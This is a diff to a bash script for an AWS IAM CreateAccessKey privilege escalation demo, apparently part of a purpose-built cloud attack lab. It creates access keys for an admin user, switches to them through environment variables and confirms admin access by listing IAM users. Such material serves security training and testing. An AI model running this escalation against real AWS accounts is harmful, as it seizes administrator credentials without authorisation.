@@ -12,12 +12,10 @@ YELLOW='\033[1;33m'
 NC='\033[0m' # No Color
 
 # Configuration
-PROFILE="prod"
+PROFILE="pl-pathfinder-starting-user-prod"
 STARTING_USER="pl-pathfinder-starting-user-prod"
 PRIVESC_ROLE="pl-cak-adam"
 ADMIN_USER="pl-cak-admin"
-TEMP_CREDS_FILE="/tmp/pl-cak-temp-creds.json"
-TEMP_PROFILE="pl-cak-temp-admin"
 
 echo -e "${GREEN}========================================${NC}"
 echo -e "${GREEN}IAM CreateAccessKey Privilege Escalation Demo${NC}"
@@ -86,25 +84,28 @@ NEW_SECRET_ACCESS_KEY=$(echo $NEW_ACCESS_KEY | jq -r '.AccessKey.SecretAccessKey
 echo "Created new access key: $NEW_ACCESS_KEY_ID"
 echo -e "${GREEN}✓ Successfully created access keys for admin user${NC}\n"
 
-# Save credentials for cleanup
-echo "$NEW_ACCESS_KEY" > $TEMP_CREDS_FILE
+# Sleep 
+echo -e "${GREEN}✓ Sleeping for 15 seconds to let the keys initialize${NC}\n"
+sleep 15
 
-# Step 6: Configure temporary profile with new admin credentials
-echo -e "${YELLOW}Step 6: Configuring temporary AWS profile with new admin credentials${NC}"
-aws configure set aws_access_key_id $NEW_ACCESS_KEY_ID --profile $TEMP_PROFILE
-aws configure set aws_secret_access_key $NEW_SECRET_ACCESS_KEY --profile $TEMP_PROFILE
-aws configure set region us-east-1 --profile $TEMP_PROFILE
+# Step 6: Switch to new admin credentials
+echo -e "${YELLOW}Step 6: Switching to new admin credentials via environment variables${NC}"
+# Unset the session token from the assumed role
+unset AWS_SESSION_TOKEN
 
-echo -e "${GREEN}✓ Configured temporary profile: $TEMP_PROFILE${NC}\n"
+# Export the new admin credentials
+export AWS_ACCESS_KEY_ID=$NEW_ACCESS_KEY_ID
+export AWS_SECRET_ACCESS_KEY=$NEW_SECRET_ACCESS_KEY
+echo -e "${GREEN}✓ Switched to admin user credentials${NC}\n"
 
 # Step 7: Verify admin access
 echo -e "${YELLOW}Step 7: Verifying administrator access with new credentials${NC}"
-ADMIN_IDENTITY=$(aws sts get-caller-identity --profile $TEMP_PROFILE --query 'Arn' --output text)
+ADMIN_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $ADMIN_IDENTITY"
 
 # Test admin permissions
 echo "Testing admin permissions (listing IAM users)..."
-IAM_USERS=$(aws iam list-users --profile $TEMP_PROFILE --query 'Users[*].UserName' --output text | head -5)
+IAM_USERS=$(aws iam list-users --query 'Users[*].UserName' --output text | head -5)
 echo "Successfully listed IAM users: $IAM_USERS"
 echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"
 
